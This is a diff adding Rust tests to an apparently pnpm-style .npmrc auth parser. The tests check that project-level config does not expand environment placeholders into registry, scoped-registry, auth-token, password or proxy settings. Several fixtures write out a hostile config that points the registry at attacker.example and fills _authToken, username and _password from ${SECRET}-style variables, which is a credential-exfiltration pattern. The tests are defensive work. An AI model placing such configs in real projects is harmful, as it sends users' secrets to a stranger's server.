@@ -149,6 +149,119 @@ fn env_replace_substitutes_token() {
 }
 
 #[test]
+fn project_ini_ignores_env_placeholders_in_registry_urls() {
+    static_env!(EnvWithSecret, &[("SECRET", "leaked")]);
+
+    let auth = NpmrcAuth::from_project_ini::<EnvWithSecret>(
+        "registry=https://registry.example.com/${SECRET}/\n",
+        Path::new(""),
+    );
+
+    assert_eq!(auth.registry, None);
+    assert!(auth.warnings.iter().any(|warning| warning.contains("registry")));
+
+    let mut config = Config::new();
+    auth.apply_to::<EnvWithSecret>(&mut config);
+    assert!(!config.registry.contains("leaked"));
+}
+
+#[test]
+fn project_ini_ignores_env_placeholders_in_scoped_registry_urls() {
+    static_env!(EnvWithSecret, &[("SECRET", "leaked")]);
+
+    let auth = NpmrcAuth::from_project_ini::<EnvWithSecret>(
+        "@scope:registry=https://registry.example.com/${SECRET}/\n",
+        Path::new(""),
+    );
+
+    assert!(auth.creds_by_uri.is_empty());
+    assert!(auth.warnings.iter().any(|warning| warning.contains("@scope:registry")));
+}
+
+#[test]
+fn trusted_ini_expands_env_placeholders_in_registry_urls() {
+    static_env!(EnvWithSecret, &[("SECRET", "trusted")]);
+
+    let auth = NpmrcAuth::from_ini::<EnvWithSecret>(
+        "registry=https://registry.example.com/${SECRET}/\n",
+        Path::new(""),
+    );
+
+    assert_eq!(auth.registry.as_deref(), Some("https://registry.example.com/trusted/"));
+}
+
+#[test]
+fn project_ini_ignores_env_placeholders_in_url_scoped_keys() {
+    static_env!(EnvWithSecret, &[("SECRET", "leaked")]);
+
+    let auth = NpmrcAuth::from_project_ini::<EnvWithSecret>(
+        "//registry.example.com/${SECRET}/:_authToken=token\n",
+        Path::new(""),
+    );
+
+    assert!(auth.creds_by_uri.is_empty());
+    assert!(
+        auth.warnings
+            .iter()
+            .any(|warning| warning.contains("//registry.example.com/${SECRET}/:_authToken")),
+    );
+}
+
+#[test]
+fn project_ini_ignores_env_placeholders_in_auth_values() {
+    static_env!(
+        EnvWithSecret,
+        &[("SECRET", "leaked"), ("USER", "leaked-user"), ("PASSWORD", "bGVha2Vk")]
+    );
+
+    let auth = NpmrcAuth::from_project_ini::<EnvWithSecret>(
+        "\
+registry=https://attacker.example/
+//attacker.example/:_authToken=${SECRET}
+_authToken=${SECRET}
+username=${USER}
+_password=${PASSWORD}
+",
+        Path::new(""),
+    );
+
+    assert!(auth.creds_by_uri.is_empty());
+    assert_eq!(auth.default_creds.auth_token, None);
+    assert_eq!(auth.default_creds.username, None);
+    assert_eq!(auth.default_creds.password, None);
+    assert!(
+        auth.warnings.iter().any(|warning| warning.contains("Ignored project-level auth setting")),
+    );
+
+    let mut config = Config::new();
+    auth.apply_to::<EnvWithSecret>(&mut config);
+    assert_eq!(config.auth_headers.for_url("https://attacker.example/pkg"), None);
+}
+
+#[test]
+fn project_ini_ignores_env_placeholders_in_proxy_urls() {
+    static_env!(EnvWithSecret, &[("SECRET", "leaked")]);
+
+    let auth = NpmrcAuth::from_project_ini::<EnvWithSecret>(
+        "\
+https-proxy=http://proxy.example.com/${SECRET}/
+http-proxy=http://proxy.example.com/${SECRET}/
+proxy=http://legacy-proxy.example.com/${SECRET}/
+",
+        Path::new(""),
+    );
+
+    assert_eq!(auth.https_proxy, None);
+    assert_eq!(auth.http_proxy, None);
+    assert_eq!(auth.legacy_proxy, None);
+    assert!(
+        auth.warnings
+            .iter()
+            .any(|warning| warning.contains("Ignored project-level request destination")),
+    );
+}
+
+#[test]
 fn env_replace_failure_warns_and_drops_unresolved_to_empty() {
     // Mirrors pnpm's `substituteEnv` lossy fallback: unresolved `${VAR}` becomes
     // "" so a downstream `Authorization: Bearer ...` header is never sent with a
